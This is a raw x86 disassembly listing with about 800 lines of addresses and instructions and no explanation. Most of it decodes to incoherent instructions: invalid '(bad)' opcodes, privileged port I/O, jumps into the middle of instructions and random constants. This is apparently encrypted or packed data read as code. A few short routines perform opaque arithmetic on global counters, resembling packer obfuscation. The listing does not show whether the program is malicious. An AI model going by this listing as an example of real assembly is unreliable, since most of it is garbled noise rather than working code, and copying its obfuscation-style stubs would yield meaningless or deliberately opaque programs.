  4060e7:	fdivr  DWORD PTR [edx-0x37]
  4060eb:	jno    0x406163
  4060ed:	test   DWORD PTR [ebx],ecx
  4060ef:	hlt    
  4060f0:	jl     0x406109
  4060f2:	xor    eax,0xaa34dd4b
  4060f7:	bound  esp,QWORD PTR [ebx-0x5cdcfa94]
  4060fd:	repz xchg ecx,eax
  4060ff:	into   
  406100:	ror    DWORD PTR [eax-0x3b],0xda
  406104:	or     BYTE PTR ds:0x7b5a8032,dh
  40610a:	cmovns ebp,DWORD PTR [esp+esi*4]
  40610e:	add    edx,DWORD PTR [edx-0x5fc29fd2]
  406114:	jb     0x4060dc
  406116:	mov    dh,0xb
  406118:	out    0x1f,eax
  40611a:	adc    BYTE PTR [eax],0x7d
  40611d:	cs rcl bh,0x23
  406121:	dec    esp
  406122:	es or  al,0x8c
  406125:	fisttp QWORD PTR [edx]
  406127:	and    al,0xfe
  406129:	add    BYTE PTR [ebx+0x62],bl
  40612c:	mov    esp,0xb385bc0d
  406131:	dec    ecx
  406132:	jne    0x406106
  406134:	out    0xc8,eax
  406136:	ins    BYTE PTR es:[edi],dx
  406137:	push   ecx
  406138:	jp     0x4060bb
  40613a:	stos   BYTE PTR es:[edi],al
  40613b:	push   ss
  40613c:	ret    
  40613d:	nop
  40613e:	cli    
  40613f:	or     DWORD PTR [edi-0x57],0x7050a5a5
  406146:	test   al,0x10
  406148:	in     eax,0x5c
  40614a:	dec    esi
  40614b:	or     dl,0xad
  40614e:	xor    eax,0xbce3d0b6
  406153:	int3   
  406154:	lock sub BYTE PTR [edx+0x658c66c8],0xec
  40615c:	repz test eax,0x7d5af7cc
  406162:	xchg   ebp,esp
  406164:	mov    ecx,ds
  406166:	add    DWORD PTR [eax+0x6b],esi
  406169:	lahf   
  40616a:	cmc    
  40616b:	add    al,0xaa
  40616d:	aas    
  40616e:	inc    esi
  40616f:	ss xor dl,ch
  406172:	fbld   TBYTE PTR [esi+ebx*2]
  406175:	jb     0x4061df
  406177:	and    cl,bl
  406179:	pop    eax
  40617a:	(bad)  [ecx-0x79]
  40617d:	dec    edi
  40617e:	push   edi
  40617f:	push   esi
  406180:	(bad)  
  406181:	imul   esi,DWORD PTR [edx-0xb],0xe4d69e0c
  406188:	adc    bh,BYTE PTR [edx+0x273b5490]
  40618e:	jnp    0x406145
  406190:	push   edx
  406191:	icebp  
  406192:	dec    BYTE PTR [edi]
  406194:	pop    ebp
  406195:	repz fs xchg esp,eax
  406198:	loop   0x406209
  40619a:	enter  0x9da9,0xca
  40619e:	pop    ds
  40619f:	jnp    0x4061f0
  4061a1:	test   BYTE PTR [ebx+edx*4],0xa9
  4061a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061a6:	fcmovb st,st(3)
  4061a8:	ret    0xb9a
  4061ab:	fadd   st,st(2)
  4061ad:	out    0xe1,al
  4061af:	inc    esi
  4061b0:	retf   0xca6
  4061b3:	mov    ebp,0xd75ec847
  4061b8:	sti    
  4061b9:	inc    eax
  4061ba:	add    eax,0xcc438335
  4061bf:	mov    eax,0x2ed2598
  4061c4:	loop   0x406214
  4061c6:	(bad)  
  4061c7:	ins    BYTE PTR es:[edi],dx
  4061c8:	add    eax,0x71c0d957
  4061cd:	out    dx,al
  4061ce:	mov    ch,0x55
  4061d0:	xor    DWORD PTR [esi-0xf],edi
  4061d3:	pop    es
  4061d4:	ficom  DWORD PTR [ebp+0x4c72daf5]
  4061da:	inc    esi
  4061db:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061dd:	mov    bh,0x2
  4061df:	mov    edi,0xbbe97fee
  4061e4:	add    cl,BYTE PTR [edx+eax*1-0x4d7177db]
  4061eb:	push   ecx
  4061ec:	jge    0x40617a
  4061ee:	test   eax,0x5b05f31
  4061f3:	hlt    
  4061f4:	rcr    BYTE PTR [edi-0x39a6d472],1
  4061fa:	dec    esi
  4061fb:	and    edx,DWORD PTR [edi-0x42]
  4061fe:	xchg   DWORD PTR [eax],edx
  406200:	(bad)  
  406202:	mov    edi,0xd5fed088
  406207:	xchg   edi,eax
  406208:	pop    eax
  406209:	jnp    0x4061d2
  40620b:	jb     0x4061bc
  40620d:	jle    0x40619f
  40620f:	or     edx,DWORD PTR [edx+ecx*8-0x72b629c3]
  406216:	out    dx,eax
  406217:	stc    
  406218:	not    BYTE PTR [eax-0x44]
  40621b:	adc    al,0x73
  40621d:	rcr    ch,0xc4
  406220:	fst    QWORD PTR [ecx+edx*8-0x36]
  406224:	test   edx,edx
  406226:	test   al,0x87
  406228:	xlat   BYTE PTR ds:[ebx]
  406229:	push   ebp
  40622a:	inc    edi
  40622b:	and    BYTE PTR [esi-0x58],dl
  40622e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406230:	or     bl,BYTE PTR [edi]
  406232:	xchg   ecx,eax
  406233:	jmp    0x4061d7
  406235:	dec    ebp
  406236:	jbe    0x4061d8
  406238:	jae    0x40624e
  40623a:	daa    
  40623b:	pusha  
  40623c:	int3   
  40623d:	scas   al,BYTE PTR es:[edi]
  40623e:	sbb    eax,0x507fb54c
  406243:	fdivr  DWORD PTR [edi]
  406245:	push   ebp
  406246:	or     al,0x7f
  406248:	or     BYTE PTR [edi+ecx*8-0x1667941d],bl
  40624f:	and    al,0x90
  406251:	cdq    
  406252:	mov    bl,0xc2
  406254:	mov    BYTE PTR [ecx+ebx*2],cl
  406257:	inc    edi
  406258:	cwde   
  406259:	adc    al,0x19
  40625b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40625c:	jne    0x40625e
  40625e:	xchg   ecx,eax
  40625f:	inc    ebp
  406260:	ins    BYTE PTR es:[edi],dx
  406261:	je     0x4062df
  406263:	fisub  DWORD PTR [eax-0x3a]
  406266:	pop    ecx
  406267:	arpl   WORD PTR [ecx],sp
  406269:	aaa    
  40626a:	fcomp  st(3)
  40626c:	push   esp
  40626d:	aam    0xd0
  40626f:	ds ffreep st(3)
  406272:	cwde   
  406273:	shl    DWORD PTR [eax+0x54],0x28
  406277:	mov    ?,ebp
  406279:	call   0x5348dca6
  40627e:	into   
  40627f:	cld    
  406280:	test   DWORD PTR [ecx+0x73],0x465afdb7
  406287:	or     ecx,DWORD PTR [edx]
  406289:	sub    DWORD PTR [esi+edx*2+0x458bfb25],esp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	or     esi,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi-0x76ffbd02],al
  40629f:	inc    esi
  4062a0:	or     al,0x9
  4062a2:	or     eax,0x42e7f3
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fe72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fe72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fe72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e63b
  4062e2:	cmp    DWORD PTR ds:0x42fe72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fe72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fe72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fe72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fe72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	adc    al,0x9d
  406330:	sti    
  406331:	fmul   QWORD PTR [esp+edi*1+0x7fa77070]
  406338:	jo     0x4063aa
  40633a:	out    0xf1,al
  40633c:	cmp    bl,ah
  40633e:	mov    esp,0x2c6378c5
  406343:	sbb    ah,BYTE PTR [edx-0x4f90e601]
  406349:	or     eax,0xbde39179
  40634e:	scas   al,BYTE PTR es:[edi]
  40634f:	(bad)  
  406350:	cs cdq 
  406352:	les    edx,FWORD PTR [edi]
  406354:	xor    BYTE PTR [esi-0x19e28df7],ch
  40635a:	mov    BYTE PTR [bx-0x6d],dl
  40635e:	fidivr DWORD PTR [eax]
  406360:	(bad)  
  406361:	mov    esi,0xff123d1f
  406366:	in     al,dx
  406367:	fist   DWORD PTR [edx+0x278f601e]
  40636d:	mov    ch,0x22
  40636f:	sbb    ebx,esi
  406371:	ss scas eax,DWORD PTR es:[edi]
  406373:	cli    
  406374:	in     eax,dx
  406375:	jg     0x40639c
  406377:	lds    esp,FWORD PTR [edi+0x3aa12274]
  40637d:	push   edi
  40637e:	(bad)  
  40637f:	pop    esi
  406380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406381:	int    0xbc
  406383:	repz sar DWORD PTR [edi],1
  406386:	pop    DWORD PTR [ebp-0x67]
  406389:	leave  
  40638a:	jns    0x40634b
  40638c:	scas   eax,DWORD PTR es:[edi]
  40638d:	xchg   esi,eax
  40638e:	dec    esi
  40638f:	add    bl,BYTE PTR [edi]
  406391:	pop    ebx
  406392:	jp     0x40631d
  406394:	xor    al,0x7a
  406396:	clc    
  406397:	jb     0x406397
  406399:	sub    DWORD PTR [ecx-0xe],esp
  40639c:	dec    edi
  40639d:	xor    al,0xee
  40639f:	inc    ebp
  4063a0:	pop    ebp
  4063a1:	les    edx,FWORD PTR ds:0x161e282d
  4063a7:	lods   eax,DWORD PTR ds:[esi]
  4063a8:	pop    ebp
  4063a9:	jmp    0x406343
  4063ab:	or     edi,esi
  4063ad:	pop    esp
  4063ae:	adc    al,0x8e
  4063b0:	fdivr  QWORD PTR [eax+0x5e]
  4063b3:	or     BYTE PTR [ebx+edi*1+0x1a],0x63
  4063b8:	push   ss
  4063b9:	dec    edx
  4063ba:	pop    ss
  4063bb:	or     BYTE PTR [edx-0x60],0xe1
  4063bf:	jns    0x4063bd
  4063c1:	sub    BYTE PTR [esi],ah
  4063c3:	mov    WORD PTR [eax+0x215b8398],?
  4063c9:	into   
  4063ca:	push   eax
  4063cb:	ret    0xd50c
  4063ce:	loop   0x406418
  4063d0:	imul   BYTE PTR [ecx+0x5b]
  4063d3:	lea    esi,[eax+0x51d4fef5]
  4063d9:	in     al,dx
  4063da:	pop    ss
  4063db:	and    BYTE PTR [ebx-0x5f],0xa0
  4063df:	adc    BYTE PTR ds:0xff6b9e3,bh
  4063e5:	(bad)  
  4063e6:	out    0xa6,al
  4063e8:	and    ah,ch
  4063ea:	nop
  4063eb:	add    al,0x1
  4063ed:	sahf   
  4063ee:	pop    ds
  4063ef:	or     ecx,DWORD PTR [esi]
  4063f1:	mov    ds:0x97283c5b,eax
  4063f6:	push   es
  4063f7:	mov    ebx,0xcea90e
  4063fc:	adc    DWORD PTR [ecx],0xd
  4063ff:	es mov eax,0xf9a21b6a
  406405:	out    0x88,al
  406407:	mov    bl,BYTE PTR [edi]
  406409:	sbb    al,0x65
  40640b:	out    0x5d,eax
  40640d:	test   BYTE PTR [ebx-0x7a],bh
  406410:	xchg   esi,eax
  406411:	fimul  DWORD PTR [ebp+0x55f394f1]
  406417:	fnstcw WORD PTR [ecx+0x7d218acf]
  40641d:	pushf  
  40641e:	xor    cl,BYTE PTR [ebx+0x7b104eeb]
  406424:	jo     0x406450
  406426:	fcmove st,st(7)
  406428:	int3   
  406429:	mov    DWORD PTR [ecx+0x6],ebp
  40642c:	aas    
  40642d:	sub    BYTE PTR [edi+0x52],ah
  406430:	sub    eax,DWORD PTR [esi-0x7454ee75]
  406436:	jp     0x406449
  406438:	pop    es
  406439:	pop    es
  40643a:	xchg   esp,eax
  40643b:	xor    al,0xce
  40643d:	xchg   ebp,eax
  40643e:	push   ss
  40643f:	out    dx,al
  406440:	shl    DWORD PTR [ebp-0x7e2c4065],cl
  406446:	leave  
  406447:	or     bh,bh
  406449:	popa   
  40644a:	cwde   
  40644b:	pop    edi
  40644c:	retf   0xb718
  40644f:	adc    eax,0xd747ac17
  406454:	inc    esp
  406455:	test   eax,0x3d4a815b
  40645a:	std    
  40645b:	and    edx,DWORD PTR fs:[esi+0x7]
  40645f:	push   esp
  406460:	cmp    edi,DWORD PTR [esi]
  406462:	inc    ebx
  406463:	xlat   BYTE PTR ds:[ebx]
  406464:	pop    ds
  406465:	sub    BYTE PTR [ebx-0x2b],dl
  406468:	pop    es
  406469:	arpl   si,cx
  40646b:	popf   
  40646c:	scas   al,BYTE PTR es:[edi]
  40646d:	retfw  
  40646f:	xchg   ecx,eax
  406470:	xchg   ebx,eax
  406471:	xor    BYTE PTR [edi],ch
  406473:	or     DWORD PTR [ecx+0x584ad2de],edx
  406479:	add    BYTE PTR [eax],0xf1
  40647c:	call   0xb1d35234
  406481:	dec    esp
  406482:	in     eax,dx
  406483:	jecxz  0x406499
  406485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406486:	pushf  
  406487:	arpl   WORD PTR [edi+0x11],bx
  40648a:	imul   edi,ebx,0xe45fb2fd
  406490:	fst    QWORD PTR [esi+0x733ff05c]
  406496:	mov    al,ds:0xa17bfb71
  40649b:	(bad)  
  40649c:	cmp    dl,ah
  40649e:	cmp    eax,DWORD PTR [edi+ecx*2-0xd]
  4064a2:	inc    esp
  4064a3:	or     eax,0x6e5237fe
  4064a8:	jne    0x406440
  4064aa:	jno    0x4064be
  4064ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064ad:	fcmovne st,st(4)
  4064af:	out    0x30,al
  4064b1:	icebp  
  4064b2:	add    bl,cl
  4064b4:	or     BYTE PTR [ebp-0xe],bh
  4064b7:	push   edi
  4064b8:	std    
  4064b9:	imul   esi,DWORD PTR [esi],0x57d0d403
  4064bf:	scas   eax,DWORD PTR es:[edi]
  4064c0:	aas    
  4064c1:	xor    al,0xfb
  4064c3:	adc    DWORD PTR [edi+0x29],ebx
  4064c6:	add    bh,BYTE PTR [edi+esi*8-0x6e]
  4064ca:	mov    al,ds:0xbee4f053
  4064cf:	xchg   edx,eax
  4064d0:	sub    eax,0x5e1684e1
  4064d5:	jo     0x406477
  4064d7:	xor    ebp,esp
  4064d9:	ins    BYTE PTR es:[edi],dx
  4064da:	xor    ebp,DWORD PTR [eax+0x7f]
  4064dd:	push   esp
  4064de:	xor    DWORD PTR [eax+0x5e2dd54a],esp
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fe76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fdf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fe72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fe72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fdd9,0x42e7fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	jmp    0x703a:0x334d0f35
  40656d:	jo     0x406551
  40656f:	jle    0x4065e1
  406571:	jo     0x406533
  406573:	lahf   
  406574:	push   esp
  406575:	lahf   
  406576:	adc    dh,BYTE PTR [ebx-0x389397a0]
  40657c:	test   BYTE PTR [ecx-0x4a],bl
  40657f:	bound  ebx,QWORD PTR [esp+ebp*8+0x22]
  406583:	lahf   
  406584:	retf   
  406585:	iret   
  406586:	test   BYTE PTR [edi-0x72],cl
  406589:	(bad)  
  40658a:	sbb    eax,0x69df6edb
  40658f:	(bad)  
  406591:	retf   
  406592:	aas    
  406593:	dec    eax
  406594:	gs mov eax,0x627921bb
  40659a:	add    eax,0x76060a2b
  40659f:	fild   DWORD PTR [ecx]
  4065a1:	inc    ebx
  4065a2:	or     al,BYTE PTR [edi+0x64]
  4065a5:	sti    
  4065a6:	out    dx,al
  4065a7:	test   eax,0x43f92141
  4065ac:	call   edx
  4065ae:	inc    esp
  4065af:	sbb    BYTE PTR [ebx+0x4ee505c],cl
  4065b5:	cmp    DWORD PTR [ecx-0x36515ba],esi
  4065bb:	aaa    
  4065bc:	(bad)  
  4065bd:	jmp    0x40660d
  4065bf:	es sub al,0x38
  4065c2:	xor    cl,ah
  4065c4:	mov    ebx,0x8fb159ae
  4065c9:	clc    
  4065ca:	xor    DWORD PTR [esi-0x61],ebx
  4065cd:	pop    esi
  4065ce:	ret    0xa9e5
  4065d1:	pop    ebx
  4065d2:	stos   DWORD PTR es:[edi],eax
  4065d3:	add    edi,ebp
  4065d5:	xor    al,0xf6
  4065d7:	repz jo 0x40662c
  4065da:	add    al,0x7f
  4065dc:	cmp    BYTE PTR [ebx+0x24],ch
  4065df:	je     0x406593
  4065e1:	cmp    BYTE PTR [esi-0x3c49d046],0x6b
  4065e8:	mov    ah,0xa1
  4065ea:	mov    ebx,0x50ab9c04
  4065ef:	sar    ch,cl
  4065f1:	add    edi,DWORD PTR [edi+0x2b]
  4065f4:	gs dec esi
  4065f6:	sbb    edi,eax
  4065f8:	dec    edi
  4065f9:	loopne 0x406617
  4065fb:	add    DWORD PTR [eax],eax
  4065fd:	inc    edx
  4065fe:	mov    edx,0xcac2b3e3
  406603:	xchg   ebp,eax
  406604:	jns    0x406616
  406606:	or     eax,0xfadd5975
  40660b:	sahf   
  40660c:	sbb    ah,cl
  40660e:	fldcw  WORD PTR [edx+0x44d782bc]
  406614:	xor    eax,0xe72fb6fc
  406619:	xchg   esi,eax
  40661a:	sar    DWORD PTR [esi],1
  40661c:	mov    edx,0x5cd7eb79
  406621:	xor    al,0x48
  406623:	push   ss
  406624:	js     0x406655
  406626:	stc    
  406627:	jg     0x406676
  406629:	dec    esp
  40662a:	outs   dx,BYTE PTR ds:[esi]
  40662b:	stc    
  40662c:	das    
  40662d:	fsub   DWORD PTR [edx-0x22b5e792]
  406633:	dec    edi
  406634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406635:	stc    
  406636:	outs   dx,BYTE PTR ds:[esi]
  406637:	test   eax,0xdcdde007
  40663c:	jl     0x4065f3
  40663e:	cld    
  40663f:	fnstcw WORD PTR [esi+ebx*1-0x76]
  406643:	daa    
  406644:	retf   
  406645:	jp     0x406622
  406647:	inc    ebp
  406648:	adc    ecx,DWORD PTR [esi+0x1f]
  40664b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40664c:	lock cvtpi2ps xmm2,mm5
  406650:	sub    eax,0xceb62bd2
  406655:	cli    
  406656:	stc    
  406657:	mov    esp,0x53198114
  40665c:	add    al,0xb1
  40665e:	xchg   esp,eax
  40665f:	add    bl,ch
  406661:	sbb    DWORD PTR [ebx+ecx*1],ebp
  406664:	inc    eax
  406665:	mov    bl,0xcb
  406667:	int3   
  406668:	jo     0x40661c
  40666a:	into   
  40666b:	mov    WORD PTR es:[eax+0x2b2fc675],ss
  406672:	sub    BYTE PTR [ebx+0x1bbc852a],0x94
  406679:	hlt    
  40667a:	push   ecx
  40667b:	pop    edi
  40667c:	imul   esi,edx,0x0
  40667f:	std    
  406680:	neg    DWORD PTR [esi-0x69e85694]
  406686:	and    BYTE PTR [ebx],0xc5
  406689:	and    al,0xfd
  40668b:	dec    edi
  40668c:	pop    ebx
  40668d:	push   0x6b3ec26
  406692:	scas   eax,DWORD PTR es:[edi]
  406693:	mov    ds:0x76bea509,eax
  406698:	adc    edi,esp
  40669a:	add    cl,BYTE PTR [eax-0x25]
  40669d:	add    ebx,DWORD PTR [ecx-0x6f]
  4066a0:	add    DWORD PTR [ebx],ebx
  4066a2:	or     BYTE PTR [esi-0x21],bh
  4066a5:	push   esp
  4066a6:	(bad)  
  4066a8:	pop    eax
  4066a9:	jae    0x4066f0
  4066ab:	test   al,dl
  4066ad:	mov    ch,0x2d
  4066af:	fisubr WORD PTR [ebp-0xd]
  4066b2:	retf   
  4066b3:	ror    BYTE PTR [esi-0x39072ded],cl
  4066b9:	xchg   ecx,eax
  4066ba:	xor    bh,BYTE PTR ds:0x1f886224
  4066c0:	sbb    eax,0x5908a6d5
  4066c5:	mov    dh,0x62
  4066c7:	pop    ebx
  4066c8:	stos   DWORD PTR es:[edi],eax
  4066c9:	ja     0x4066dd
  4066cb:	dec    esp
  4066cc:	shl    BYTE PTR ds:0xcaf80cb9,cl
  4066d2:	jp     0x40665c
  4066d4:	pop    ebp
  4066d5:	push   ebp
  4066d6:	pop    ecx
  4066d7:	jnp    0x406730
  4066d9:	xor    eax,0xf077acb9
  4066de:	mov    dh,0xfe
  4066e0:	mov    ah,0x5b
  4066e2:	aaa    
  4066e3:	shl    DWORD PTR [ebp-0x3c],1
  4066e6:	jne    0x406742
  4066e8:	fst    st(5)
  4066ea:	popf   
  4066eb:	iret   
  4066ec:	arpl   di,sp
  4066ee:	xchg   ebx,eax
  4066ef:	arpl   WORD PTR [esi+0xd],di
  4066f2:	fsubr  DWORD PTR [edi]
  4066f4:	daa    
  4066f5:	push   0x8ee2f95a
  4066fa:	clc    
  4066fb:	jle    0x4066a1
  4066fd:	lods   al,BYTE PTR ds:[esi]
  4066fe:	xor    bh,BYTE PTR [esi+0x11]
  406701:	jbe    0x4066c0
  406703:	cmp    bl,BYTE PTR [esi-0x3cbbfafe]
  406709:	inc    esi
  40670a:	(bad)  
  40670b:	shr    ebp,cl
  40670d:	or     al,0xe0
  40670f:	inc    edi
  406710:	mov    eax,0xea46914e
  406715:	rcl    BYTE PTR [ecx+0x7d90acf8],0x73
  40671c:	jl     0x4066ee
  40671e:	cwde   
  40671f:	dec    edi
  406720:	xor    al,0xb9
  406722:	test   eax,0x5d5f43b4
  406727:	jnp    0x4067a3
  406729:	fldcw  WORD PTR [ecx+eax*4+0x3fbc712b]
  406730:	add    edi,ecx
  406732:	or     eax,edx
  406734:	mov    eax,0xa805f33c
  406739:	mov    ebx,0x395de860
  40673e:	lods   eax,DWORD PTR ds:[esi]
  40673f:	jle    0x40670f
  406741:	add    eax,0x50849d5a
  406746:	rol    edx,1
  406748:	call   FWORD PTR [ebp+0x64f1c2b]
  40674e:	nop
  40674f:	and    dl,BYTE PTR [esp+ebp*2-0x34b1e45b]
  406756:	popf   
  406757:	(bad)  
  406758:	ins    DWORD PTR es:[edi],dx
  406759:	or     bl,BYTE PTR [edx-0x2a]
  40675c:	rcr    BYTE PTR [ebp+0x1ee21b7e],cl
  406762:	lock jecxz 0x4067c7
  406765:	stos   DWORD PTR es:[edi],eax
  406766:	outs   dx,BYTE PTR ds:[esi]
  406767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406768:	push   esp
  406769:	mov    ah,0xf3
  40676b:	mov    ebp,0x16aeba84
  406770:	inc    di
  406772:	bound  esi,QWORD PTR [esi-0x4c45b704]
  406778:	cmp    DWORD PTR [ecx+0x24],esp
  40677b:	aam    0x11
  40677d:	push   cs
  40677e:	push   esi
  40677f:	lods   eax,DWORD PTR ds:[esi]
  406780:	ror    bl,1
  406782:	repnz out dx,eax
  406784:	or     esi,ecx
  406786:	jg     0x406798
  406788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406789:	push   ds
  40678a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40678b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40678c:	jle    0x4067b1
  40678e:	dec    ebx
  40678f:	cmp    edi,ebx
  406791:	lods   al,BYTE PTR ds:[esi]
  406792:	mov    eax,ds:0x39ad5263
  406797:	and    BYTE PTR [edi-0x3b],cl
  40679a:	cdq    
  40679b:	ins    DWORD PTR es:[edi],dx
  40679c:	lea    ebx,[ecx-0x3a]
  40679f:	sti    
  4067a0:	sbb    ch,ch
  4067a2:	mov    ?,WORD PTR fs:[ebx-0x531543ef]
  4067a9:	pop    ecx
  4067aa:	sub    esi,esi
  4067ac:	mov    bh,0x9
  4067ae:	(bad)  
  4067af:	pushf  
  4067b0:	sahf   
  4067b1:	scas   al,BYTE PTR es:[edi]
  4067b2:	jne    0x406815
  4067b4:	cwde   
  4067b5:	xchg   edi,eax
  4067b6:	inc    ebx
  4067b7:	ja     0x4067b9
  4067b9:	icebp  
  4067ba:	xor    DWORD PTR [edx-0x2ee65c6f],edi
  4067c0:	adc    ch,BYTE PTR [ebp+edx*1+0x20c20ca]
  4067c7:	push   edx
  4067c8:	in     al,0xf9
  4067ca:	adc    eax,0x20033229
  4067cf:	push   ds
  4067d0:	(bad)  
  4067d1:	sub    eax,0xe90c5315
  4067d6:	and    al,0xf
  4067d8:	push   ds
  4067d9:	push   cs
  4067da:	and    DWORD PTR [eax+0x59956004],0xffffff8b
  4067e1:	push   ebp
  4067e2:	adc    BYTE PTR [ecx-0x3dccf7be],cl
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fdd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e220,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e7fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fde5,0x42e813
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	jle    0x406818
  406848:	push   ebp
  406849:	mov    BYTE PTR [ebp-0x1d8f8fc8],ah
  40684f:	jle    0x4068c1
  406851:	jo     0x406860
  406853:	sbb    BYTE PTR [edi],bh
  406855:	sbb    DWORD PTR [esi-0x5e45da6b],0xf6602157
  40685f:	lds    ebx,FWORD PTR [esi+0x5a]
  406862:	jb     0x406816
  406864:	aam    0x3b
  406866:	fistp  DWORD PTR [edi-0x2c]
  406869:	sub    DWORD PTR [esi-0x11],ecx
  40686c:	popa   
  40686d:	stc    
  40686e:	jo     0x406820
  406870:	std    
  406871:	or     DWORD PTR [eax],ecx
  406873:	pop    ecx
  406874:	fimul  DWORD PTR [esi-0x204fca51]
  40687a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40687b:	inc    esi
  40687c:	mov    ch,0xb0
  40687e:	lea    esi,[ebx+edx*8-0x60]
  406882:	clc    
  406883:	jge    0x4068b9
  406885:	mov    ch,0xf8
  406887:	push   0xa7eb221
  40688c:	sub    al,0x92
  40688e:	ins    DWORD PTR es:[edi],dx
  40688f:	lahf   
  406890:	xchg   BYTE PTR [edx-0x6a84b341],dl
  406896:	dec    ebx
  406897:	mov    eax,0x650f5946
  40689c:	jg     0x4068ec
  40689e:	dec    ebp
  40689f:	data16 xor al,ch
  4068a2:	push   0x2e
  4068a4:	ret    
  4068a5:	lds    ebp,FWORD PTR [ebp+ebp*1+0x4a7bda30]
  4068ac:	les    eax,FWORD PTR [edi+0x1e]
  4068af:	lea    esi,[ebx-0x17]
  4068b2:	sti    
  4068b3:	test   cl,0x8c
  4068b6:	add    BYTE PTR [ebp-0x79e73578],al
  4068bc:	popf   
  4068bd:	push   ebp
  4068be:	mov    edx,0xba3299ea
  4068c3:	shl    al,0x5d
  4068c6:	push   ds
  4068c7:	scas   eax,DWORD PTR es:[edi]
  4068c8:	pop    ebx
  4068c9:	sar    ch,1
  4068cb:	aas    
  4068cc:	xor    eax,0x61f9e865
  4068d1:	sbb    DWORD PTR [edi],0x1cc89b71
  4068d7:	sub    edi,DWORD PTR [ecx-0x7b]
  4068da:	std    
  4068db:	mov    ds:0xc296b476,al
  4068e0:	fidivr WORD PTR [ebx+0x17]
  4068e3:	pop    es
  4068e4:	add    BYTE PTR [ebx+0x4aaf64c1],dh
  4068ea:	inc    edx
  4068eb:	mov    WORD PTR [eax+0x3d],ss
  4068ee:	leave  
  4068ef:	ret    0xbe3e
  4068f2:	xchg   ebp,eax
  4068f3:	ds xor ah,0xe5
  4068f7:	xchg   ebp,eax
  4068f8:	cmp    ebx,eax
  4068fa:	ret    0x7a89
  4068fd:	pop    esi
